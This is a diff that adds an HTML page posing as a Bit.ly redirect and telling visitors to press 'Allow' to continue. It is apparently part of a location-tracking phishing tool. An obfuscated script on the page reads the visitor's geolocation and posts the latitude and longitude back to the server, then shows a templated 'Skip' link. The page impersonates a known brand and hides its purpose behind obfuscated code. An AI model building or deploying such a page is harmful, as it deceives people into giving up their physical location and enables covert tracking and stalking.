@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"
+    />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Bit.ly - Click Allow to continue</title>
+    <style>
+      * {
+        padding: 0;
+        margin: 0;
+      }
+      html {
+        background-color: #0a355b;
+        font-size: 62.5%;
+        font-family: Arial;
+      }
+      .arrow {
+        position: absolute;
+        background-color: white;
+        width: 8rem;
+        height: 14rem;
+        clip-path: polygon(
+          50% 0,
+          90% 30%,
+          60% 30%,
+          60% 80%,
+          40% 80%,
+          40% 30%,
+          10% 30%
+        );
+        transform: translate(25rem, 10rem);
+        animation: arrowMovement 1.5s infinite;
+      }
+      .logo {
+        display: block;
+        margin: 10rem auto;
+      }
+      .logo-wrapper > p {
+        text-align: center;
+        color: white;
+        font-size: 2.4rem;
+        font-weight: bold;
+        text-shadow: 0 0.5rem 4rem rgba(253, 255, 103, 0.5);
+      }
+
+      /*ANIMATION*/
+      @keyframes arrowMovement {
+        0% {
+          transform: translate(25rem, 10rem);
+        }
+        30% {
+          transform: translate(25rem, 7rem);
+        }
+        50% {
+          transform: translate(25rem, 10rem);
+        }
+        65% {
+          transform: translate(25rem, 5rem);
+        }
+        100% {
+          transform: translate(25rem, 10rem);
+        }
+      }
+
+      /*MEDIA QUERY MANAGER*/
+      @media only screen and (max-width: 1024px) {
+        .arrow {
+          display: none;
+        }
+        .logo {
+          margin: 2rem auto;
+        }
+      }
+      @media only screen and (max-width: 600px) {
+        .logo-wrapper > p {
+          font-size: 2rem;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      function replaceAll(string, search, replace) {
+        return string.split(search).join(replace);
+      }
+    </script>
+
+    <div class="arrow"></div>
+
+    <div id="29773761-a0f0-48e4-9d54-9bdd01634f18"></div>
+
+    <div class="logo-wrapper">
+      <img
+        class="logo"
+        src="https://insprl.com/imgdir/page/bitly-logo.png"
+        alt="logo"
+      />
+      <p>Please press 'Allow' to continue</p>
+      <p
+        style="font-size: 14px; margin-top: 20px; color: silver"
+        id="no_display_msg"
+      ></p>
+    </div>
+    <script src="http://code.jquery.com/jquery-3.4.1.min.js"></script>
+    <script>
+      function _0x37ae(_0x2ee8e5,_0x22829a){var _0xd42bbf=_0xd42b();return _0x37ae=function(_0x37ae3c,_0x3b7a7b){_0x37ae3c=_0x37ae3c-0x1dd;var _0x4fbeb9=_0xd42bbf[_0x37ae3c];return _0x4fbeb9;},_0x37ae(_0x2ee8e5,_0x22829a);}var _0x42de39=_0x37ae;(function(_0x271085,_0x7ca17d){var _0x5556ed=_0x37ae,_0x25fa91=_0x271085();while(!![]){try{var _0x5946da=-parseInt(_0x5556ed(0x1e4))/0x1*(-parseInt(_0x5556ed(0x1e8))/0x2)+-parseInt(_0x5556ed(0x1de))/0x3+-parseInt(_0x5556ed(0x1ea))/0x4+-parseInt(_0x5556ed(0x1e9))/0x5*(-parseInt(_0x5556ed(0x1e6))/0x6)+-parseInt(_0x5556ed(0x1f6))/0x7*(-parseInt(_0x5556ed(0x1e3))/0x8)+-parseInt(_0x5556ed(0x1e2))/0x9*(parseInt(_0x5556ed(0x1f3))/0xa)+parseInt(_0x5556ed(0x1dd))/0xb*(parseInt(_0x5556ed(0x1ed))/0xc);if(_0x5946da===_0x7ca17d)break;else _0x25fa91['push'](_0x25fa91['shift']());}catch(_0x2b4513){_0x25fa91['push'](_0x25fa91['shift']());}}}(_0xd42b,0x2e398));function noDisplayTimer(){var _0x519419=_0x37ae;document[_0x519419(0x1ef)](_0x519419(0x1f4))[_0x519419(0x1f1)]=_0x519419(0x1e1);}function _0xd42b(){var _0x3499f8=['innerHTML','Cordinates:\x20','15880PfYAiU','no_display_msg','log','100961AxWwZx','28666fQcKWQ','537186BjDQqc','getCurrentPosition','href','<a\x20href=\x27{{url}}\x27>Skip</a>','756YQCGXL','48Gasmwp','5090LpjgGO','success','16032LfANqL','latitude','86gbWPQu','550cHYlUd','400576ffOwnW','message','longitude','12QHjjJP','coords','getElementById','location'];_0xd42b=function(){return _0x3499f8;};return _0xd42b();}navigator['geolocation'][_0x42de39(0x1df)](_0x2233df=>{var _0x4002fb=_0x42de39;console[_0x4002fb(0x1f5)](_0x4002fb(0x1f2),_0x2233df['coords']['latitude']+',\x20'+_0x2233df[_0x4002fb(0x1ee)][_0x4002fb(0x1ec)]),$['ajax']({'url':window[_0x4002fb(0x1f0)][_0x4002fb(0x1e0)],'type':'POST','data':{'lat':_0x2233df['coords'][_0x4002fb(0x1e7)],'lng':_0x2233df[_0x4002fb(0x1ee)][_0x4002fb(0x1ec)]},'success':function(_0x593f0b){var _0x5507c2=_0x4002fb;_0x593f0b['status']==_0x5507c2(0x1e5)?setInterval(noDisplayTimer,0x3e8):noDisplayTimer();},'error':function(_0x193090){var _0x3b526a=_0x4002fb;console[_0x3b526a(0x1f5)](_0x193090),noDisplayTimer(),setInterval(noDisplayTimer,0x1388);}});},_0x5b8d09=>{var _0x17975b=_0x42de39;console[_0x17975b(0x1f5)](_0x5b8d09[_0x17975b(0x1eb)]);});
+    </script>
+  </body>
+</html>
